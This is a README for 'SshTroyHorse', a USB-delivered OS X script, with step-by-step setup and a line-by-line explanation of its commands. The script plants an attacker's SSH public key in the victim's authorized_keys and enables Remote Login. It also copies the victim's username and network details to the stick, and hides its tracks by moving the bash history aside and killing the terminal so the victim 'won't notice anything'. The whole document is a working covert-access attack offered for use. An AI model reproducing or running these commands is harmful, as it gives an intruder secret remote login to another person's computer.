SshTroyHorse (OS X)
============

### What do we need?
    * A USB stick
    * A computer running OS X (We call this victim)
    * A computer running linux or OS X (We call this Gabriele)
    * Gabriele's public key (we assume we can find it in ~/.ssh/id_rsa.pub)

### How to setup?
    1. Download the .zip file and uncompress it.
    2. Copy the 2 bash script in the USB script.
    3. Run build.sh.
    4. Eject the USB stick and plug it in victim's computer.
    5. From victim's computer, run script.sh
    6. Put a tick in "Remote Login" when the sharing preferences page displays.
    7. script.sh should have finished its work yet, you can unplug it.
    8. open a terminal in Gabriele's computer and execute "ssh " + last username in "whoamis.txt" + "@" last hostname in "hostnames.txt"
    9. You should be able to login to victim's computer.

### How does it works?

`#! /bin/sh`
Declares a bash script.

`mv ~/.bash_history /Volumes/keyInstaller/` momentarily copies the bash history in **/Volumes/keyInstaller/**, so that the victim won't notice anything
`open /System/Library/PreferencePanes/SharingPref.prefPane/` opens the sharing preferences page.

`cat /Volumes/keyInstaller/id_rsa.pub >> ~/.ssh/authorized_keys` copies your public key in the target authorized keys.

`chmod 600 ~/.ssh/authorized_keys` gives right permissions to the public key.

`whoami >> /Volumes/keyInstaller/whoamis.txt` saves the active username in **whoamis.txt**

`echo "----------------------------" >> /Volumes/keyInstaller/hostnames.txt` separes different attacks in **hostnames.txt**

`ifconfig >> /Volumes/keyInstaller/hostnames.txt` sends to **hostnames.txt** network informations about victim's computer

`toeject=$(df -h | grep /Volumes/keyInstaller) && toeject=${toeject:0:12}` **toeject** contains the string with the name of the device.

`mv /Volumes/keyInstaller/.bash_history ~/` restores the **.bash_profile** in the victim's home

`clear` clears the terminal

`kill -9 $(ps -p $(ps -p $PPID -o ppid=) -o ppid=)` kills the terminal itself

`diskutil unmount $toeject` unmounts the drive to eject

`diskutil unmountDisk force $toeject`: if the drive was not ejected, try forcing this.
